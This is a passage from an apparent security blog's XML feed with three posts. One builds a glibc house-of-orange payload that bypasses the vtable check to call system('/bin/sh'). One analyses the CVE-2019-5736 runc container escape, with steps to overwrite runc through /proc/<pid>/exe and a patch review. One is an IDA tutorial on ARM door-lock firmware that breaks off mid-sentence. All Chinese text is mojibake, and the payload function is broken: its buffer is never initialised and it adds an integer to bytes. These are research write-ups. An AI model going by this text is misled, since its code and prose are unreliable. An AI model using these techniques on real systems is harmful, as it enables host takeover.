class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®payload å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VtableCheckBypass_2</span>(<span class="params">vtable_addr,heap_addr,system_addr,binsh_addr,io_list_all_addr</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    _IO_str_finish conditions</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    houseoforange glibc.2.24 bypass vtablecheck</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    vtable_addr is _IO_str_finish addr (libc 2.24: 0x3BE050)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload += p64((binsh_addr+<span class="number">0x10</span>) &amp; ~<span class="number">1</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(io_list_all_addr<span class="number">-0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    payload += p64(vtable_addr<span class="number">-0x18</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(system_addr)</span><br><span class="line">    payload += p64(payload+<span class="number">0x660</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h2 id="0x04-ç¼“å†²åŒºä»¥åŠfilenoçš„åˆ©ç”¨"><a href="#0x04-ç¼“å†²åŒºä»¥åŠfilenoçš„åˆ©ç”¨" class="headerlink" title="0x04 ç¼“å†²åŒºä»¥åŠfilenoçš„åˆ©ç”¨"></a>0x04 ç¼“å†²åŒºä»¥åŠ<code>fileno</code>çš„åˆ©ç”¨</h2><p>åœ¨ 0x03 æåˆ°äº†<code> _IO_FILE</code> ç»“æ„ä½“ä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿›ç¨‹ä¸­åŒ…å«äº†ç³»ç»Ÿé»˜è®¤çš„ä¸‰ä¸ªæ–‡ä»¶æµ stdin\stdout\stderrï¼Œå› æ­¤è¿™ç§æ–¹å¼å¯ä»¥ä¸éœ€è¦è¿›ç¨‹ä¸­å­˜åœ¨æ–‡ä»¶æ“ä½œï¼Œé€šè¿‡ scanf\printf ä¸€æ ·å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE Pwn </tag>
            
            <tag> houseoforange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-5736 Dockeré€ƒé€¸</title>
      <link href="CVE-2019-5736-Docker-escape.html"/>
      <url>CVE-2019-5736-Docker-escape.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>å‰è¨€ï¼š æœ€è¿‘å…¬å¼€äº†ä¸€ä¸ª Dockeré€ƒé€¸çš„æ¼æ´ï¼Œåœ¨35c3 ctfç»“æŸåï¼Œç”± dragonsecto å‘ç°ã€‚<a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host</a>å°±æ­¤è‡ªå·±ç¨å¾®åˆ†æäº†ä¸€ä¸‹åŸç†ã€‚</p><h2 id="0x01-RunC"><a href="#0x01-RunC" class="headerlink" title="0x01 RunC"></a>0x01 RunC</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒRunC æ˜¯ä¸€ä¸ªè½»é‡çº§çš„å·¥å…·ï¼Œå®ƒæ˜¯ç”¨æ¥è¿è¡Œå®¹å™¨çš„ï¼Œåªç”¨æ¥åšè¿™ä¸€ä»¶äº‹ï¼Œå¹¶ä¸”è¿™ä¸€ä»¶äº‹è¦åšå¥½ã€‚æˆ‘ä»¬å¯ä»¥è®¤ä¸ºå®ƒå°±æ˜¯ä¸ªå‘½ä»¤è¡Œå°å·¥å…·ï¼Œå¯ä»¥ä¸ç”¨é€šè¿‡ docker å¼•æ“ï¼Œç›´æ¥è¿è¡Œå®¹å™¨ã€‚äº‹å®ä¸Šï¼ŒrunC æ˜¯æ ‡å‡†åŒ–çš„äº§ç‰©ï¼Œå®ƒæ ¹æ® OCI æ ‡å‡†æ¥åˆ›å»ºå’Œè¿è¡Œå®¹å™¨ã€‚è€Œ OCI(Open Container Initiative)ç»„ç»‡ï¼Œæ—¨åœ¨å›´ç»•å®¹å™¨æ ¼å¼å’Œè¿è¡Œæ—¶åˆ¶å®šä¸€ä¸ªå¼€æ”¾çš„å·¥ä¸šåŒ–æ ‡å‡†ã€‚</p><p>æ¢ä¸€å¥è¯è¯´ï¼Œå…¶å® Docker åœ¨ç®¡ç†å®¹å™¨çš„æ—¶å€™ï¼Œå…¶å®åº•å±‚å°±æ˜¯è·‘çš„RunC</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@VM-118-78-ubuntu:~<span class="comment"># docker info | grep &quot;runc&quot;</span></span><br><span class="line">Runtimes: runc</span><br><span class="line">Default Runtime: runc</span><br><span class="line">runc version: N/A (expected: 54296cf40ad8143b62dbcaa1d90e520a2136ddfe)</span><br><span class="line">WARNING: No swap <span class="built_in">limit</span> support</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214231100.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214231100.png"></a></p><p>ä»å›¾ä¸­å°±å¯ä»¥å¾—çŸ¥ï¼Œrunc å’Œdocker çš„å‘½ä»¤æ‰§è¡Œæ•ˆæœå…¶å®æ˜¯å·®ä¸å¤šçš„ã€‚</p><h2 id="0x02-PID-NameSpace"><a href="#0x02-PID-NameSpace" class="headerlink" title="0x02 PID NameSpace"></a>0x02 PID NameSpace</h2><p><strong>PID Namespace</strong>  éš”ç¦»è¿›ç¨‹pidä¹‹åï¼Œnsä¸­çš„è¿›ç¨‹æ— æ³•å‘ç°å¤–ç•Œçš„è¿›ç¨‹ã€‚è€Œå¤–éƒ¨nsä¸­è¿›ç¨‹å¯ä»¥å‘ç°nsä¸­è¿›ç¨‹ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214231734.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214231734.png"></a></p><h2 id="0x03-æ¼æ´åˆ©ç”¨ç‚¹"><a href="#0x03-æ¼æ´åˆ©ç”¨ç‚¹" class="headerlink" title="0x03 æ¼æ´åˆ©ç”¨ç‚¹"></a>0x03 æ¼æ´åˆ©ç”¨ç‚¹</h2><p>å¦å¤–ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„æ˜¯ <strong>/proc/self/exe</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214232257.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190214232257.png"></a></p><p>å¯ä»¥å‘ç° <code>proc/pid/exc</code> æ­£å¸¸æ˜¯ä¼šè¢«æŒ‡å‘æ‰€è¿è¡Œæ–‡ä»¶ã€‚è€Œè¿™ä¸ªæ¼æ´çš„æ¼æ´åˆ©ç”¨ç‚¹æ­£åœ¨äºæ­¤ï¼Œå¦‚æœä½¿ç”¨æ­¤æ—¶ç”¨ <code>docker exec binfile</code> ã€‚æ­¤æ—¶å¦‚æœèƒ½åœ¨å®¹å™¨å†…ï¼Œæ‹¿åˆ° runc çš„pid ä»è€Œè·å– runc çš„ç¬¦å·é“¾æ¥ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½é€šè¿‡è¦†ç›– runc ä¸ºæ¶æ„ç¨‹åºæ¥è¾¾åˆ° Docker é€ƒé€¸çš„ç›®çš„ã€‚</p><h2 id="0x04-æ¼æ´åˆ©ç”¨"><a href="#0x04-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x04 æ¼æ´åˆ©ç”¨"></a>0x04 æ¼æ´åˆ©ç”¨</h2><ol><li>å®¹å™¨å†…æƒ³åŠæ³•è·å– Runc PIDã€‚</li><li>å¾—åˆ° PID åï¼Œè·å–æ–‡ä»¶æè¿°ç¬¦</li><li>å¯¹ fd è¿›è¡Œå†™æ“ä½œï¼Œè¦†ç›–åŸæœ‰ runc</li></ol><ul><li>è·å– RunCçš„PIDï¼Œæˆ‘ä»¬çŸ¥é“ å®¹å™¨å†…çš„PID æ˜¯é€šè¿‡namespace ç‰¹æ®Šéš”ç¦»çš„ï¼Œé€šå¸¸è€Œè¨€ï¼Œå¦‚æœæ­¤æ—¶æœ‰è¿›ç¨‹ A ï¼Œè¿›ç¨‹ A çš„PIDä¸º 233ï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥æˆ‘ä»¬è¿è¡Œä¸ªè¿›ç¨‹ Bï¼Œé‚£ä¹ˆæ­¤æ—¶è¿›ç¨‹ B çš„PIDç†åº”ä¸º 234</li><li>è·å–æ–‡ä»¶æ“ä½œç¬¦</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;runc&#x27;</span> exe_name:</span><br><span class="line">    fp = open(<span class="string">&#x27;/proc/%d/exe&#x27;</span> % pid,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fd = fp.fileno()</span><br></pre></td></tr></table></figure><ul><li>ç„¶åå°±å¯ä»¥ é€šè¿‡æ‰“å¼€ fd çš„å½¢å¼ï¼Œå¯¹ runc æ–‡ä»¶è¿›è¡Œæ“ä½œã€‚</li></ul><p>æ¼”ç¤ºæ•ˆæœå¦‚ä¸‹ï¼š</p><p><strong>è¯·å…¨å±è§‚çœ‹ï¼ï¼ï¼</strong></p><script type="text/javascript" src="https://asciinema.org/a/XAYR7Ehuts10MXKnu3ttO8QAe.js" id="asciicast-XAYR7Ehuts10MXKnu3ttO8QAe" async></script><h2 id="0x05-è¡¥ä¸åˆ†æ"><a href="#0x05-è¡¥ä¸åˆ†æ" class="headerlink" title="0x05 è¡¥ä¸åˆ†æ"></a>0x05 è¡¥ä¸åˆ†æ</h2><p><a href="https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d">merge branch â€˜cve-2019-5736â€™</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190215002152.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190215002152.png"></a></p><p>å¯ä»¥çœ‹åˆ° æ·»åŠ äº†ä¸€ä¸ª ensure_cloned_binary å‡½æ•°ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ensure_cloned_binary(void)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> execfd;</span><br><span class="line">char **argv = NULL, **envp = NULL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check that we&#x27;re not self-cloned, and if we are then bail. */</span></span><br><span class="line"><span class="keyword">int</span> cloned = is_self_cloned();</span><br><span class="line"><span class="keyword">if</span> (cloned &gt; <span class="number">0</span> || cloned == -ENOTRECOVERABLE)</span><br><span class="line"><span class="keyword">return</span> cloned;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fetchve(&amp;argv, &amp;envp) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">execfd = clone_binary();</span><br><span class="line"><span class="keyword">if</span> (execfd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">fexecve(execfd, argv, envp);</span><br><span class="line"><span class="keyword">return</span> -ENOEXEC;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ¤æ–­ exe æ˜¯å¦è¢«clone </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">static <span class="keyword">int</span> is_self_cloned(void)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> fd, ret, is_cloned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY|O_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">ret = fcntl(fd, F_GET_SEALS);</span><br><span class="line">is_cloned = (ret == RUNC_MEMFD_SEALS);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="keyword">struct</span> stat statbuf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ret = fstat(fd, &amp;statbuf);</span><br><span class="line"><span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">is_cloned = (statbuf.st_nlink == <span class="number">0</span>);</span><br><span class="line">#endif</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="keyword">return</span> is_cloned;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœå¦ï¼Œåˆ™æ‰§è¡Œ clone_binary å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">static <span class="keyword">int</span> clone_binary(void)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> binfd, memfd;</span><br><span class="line">ssize_t sent = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">memfd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">memfd = open(<span class="string">&quot;/tmp&quot;</span>, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, <span class="number">0711</span>);</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">if</span> (memfd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">binfd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY | O_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (binfd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">sent = sendfile(memfd, binfd, NULL, RUNC_SENDFILE_MAX);</span><br><span class="line"><span class="built_in">close</span>(binfd);</span><br><span class="line"><span class="keyword">if</span> (sent &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line"><span class="keyword">int</span> err = fcntl(memfd, F_ADD_SEALS, RUNC_MEMFD_SEALS);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line"><span class="comment">/* Need to re-open &quot;memfd&quot; as read-only to avoid execve(2) giving -EXTBUSY. */</span></span><br><span class="line"><span class="keyword">int</span> newfd;</span><br><span class="line">char *fdpath = NULL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (asprintf(&amp;fdpath, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, memfd) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">newfd = open(fdpath, O_RDONLY | O_CLOEXEC);</span><br><span class="line">free(fdpath);</span><br><span class="line"><span class="keyword">if</span> (newfd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(memfd);</span><br><span class="line">memfd = newfd;</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">return</span> memfd;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line"><span class="built_in">close</span>(memfd);</span><br><span class="line"><span class="keyword">return</span> -EIO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>return ä¸€ä¸ªæ–°çš„ fd</p><h2 id="0x06-å‚è€ƒé“¾æ¥"><a href="#0x06-å‚è€ƒé“¾æ¥" class="headerlink" title="0x06 å‚è€ƒé“¾æ¥"></a>0x06 å‚è€ƒé“¾æ¥</h2><p><a href="https://www.openwall.com/lists/oss-security/2019/02/11/2">oss-security</a></p><p><a href="https://github.com/q3k/cve-2019-5736-poc">CVE-2019-36 PoC</a></p><p><a href="https://github.com/feexd/pocs/blob/master/CVE-2019-5736/exploit.c">CVE-2019-5736 docker image and exploit</a></p><p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2019-5736 </tag>
            
            <tag> Docker Escape </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use IDA reverse ARM ï¼ˆsetup and find enryp-pointï¼‰</title>
      <link href="use-ida-reverse-arm.html"/>
      <url>use-ida-reverse-arm.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ä»…ä»…ä¸€ç‚¹ç»éªŒä¹‹è°ˆ</p><h2 id="0x01-get-u-binary"><a href="#0x01-get-u-binary" class="headerlink" title="0x01 get u binary"></a>0x01 get u binary</h2><ul><li><p>dump binary from flash</p></li><li><p>dump binary when update firmware</p><p>â€¦</p></li></ul><h2 id="0x02-loader-to-ida"><a href="#0x02-loader-to-ida" class="headerlink" title="0x02 loader to ida"></a>0x02 loader to ida</h2><p>like this ï¼ŒI have a bluetooth binary ..</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115210.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115210.png"></a></p><p>we got a firmware from some one smart door lock, in he firmware upgrade traffic.</p><p>When we use ida open it,we can see it .</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115607.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115607.png"></a></p><ul><li>Firstly ,we know it is arm</li><li>Secondlye ,we guess it is  arm little-endian</li></ul><p>So,we choice Processor type:</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115911.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129115911.png"></a></p><p>than ,we press okâ€¦ we can see:</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129120005.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129120005.png"></a></p><p>we choice yes, than..</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129122829.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129122829.png"></a></p><p>How to fill this table?  Keep the default and press ok.</p><h2 id="0x03-fix-the-binary"><a href="#0x03-fix-the-binary" class="headerlink" title="0x03 fix the binary"></a>0x03 fix the binary</h2><p>when the ida auto analysis has been finished.we saw like this.</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129123558.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129123558.png"></a></p><p>what fuck this????</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129124202.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129124202.png"></a></p><p>Only rom segmentation,we should create other segmentation and find the code seg. so we should to find some information and analysis this bin .</p><p>we use hot-key â€œDâ€,to fix some data.</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129125802.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129125802.png"></a></p><p>Generally peaking , </p><p><code>:00000000                 DCD 0x20007AD8</code> after is  interupt vector</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129125846.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129125846.png"></a></p><p>In the red box is function pointer. and first function pointer is odd number ,so we can think this bin is 16-bit. So we change it use <code>alt g</code> and choice T register value 0 to 1</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129130204.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190129130204.png"></a></p><blockquote><h2 id="æ§åˆ¶ä½-å«ä¹‰"><a href="#æ§åˆ¶ä½-å«ä¹‰" class="headerlink" title="æ§åˆ¶ä½                        å«ä¹‰"></a>æ§åˆ¶ä½                        å«ä¹‰</h2><p>I                             I=1 ç¦ç”¨IROä¸­æ–­<br>F                             F=1 ç¦ç”¨FIQä¸­æ–­<br>T                             ARMv4ä»¥ä¸ŠTç‰ˆæœ¬T=0 æ‰§è¡ŒARMæŒ‡ä»¤,T=1æ‰§è¡ŒThumbæŒ‡ä»¤ã€‚<br>                              ARMv5ä»¥ä¸ŠéTç‰ˆæœ¬T=0 æ‰§è¡ŒARMæŒ‡ä»¤,T=1è¡¨ç¤ºä¸‹ä¸€æ¡æŒ‡ä»¤äº§ç”Ÿæœªå®šä¹‰æŒ‡ä»¤ä¸­æ–­ã€‚M[4:0]                  </p></blockquote><blockquote><p>thumbæŒ‡ä»¤é›†æ˜¯armæŒ‡ä»¤é›†çš„ä¸€ä¸ªå­é›†ï¼Œæ˜¯é’ˆå¯¹ä»£ç å¯†åº¦é—®é¢˜è€Œæå‡ºçš„ï¼Œå®ƒå…·æœ‰16ä½çš„ä»£ç å®½åº¦ã€‚ä¸ç­‰ä»·çš„32ä½ä»£ç ç›¸æ¯”è¾ƒï¼ŒthumbæŒ‡ä»¤é›†åœ¨ä¿ç•™32ä½ä»£ç ä¼˜åŠ¿çš„åŒæ—¶ï¼Œå¤§å¤§çš„èŠ‚çœäº†ç³»ç»Ÿçš„å­˜å‚¨ç©ºé—´ã€‚thumbä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä½“ç³»ç»“æ„ï¼Œä¸èƒ½æŒ‡æœ›å¤„ç†å™¨åªæ‰§è¡ŒthumbæŒ‡ä»¤é›†è€Œä¸æ”¯æŒarmæŒ‡ä»¤é›†ã€‚</p></blockquote><p>than we should guest the binary base address</p><p>we know ,usually the base low 3 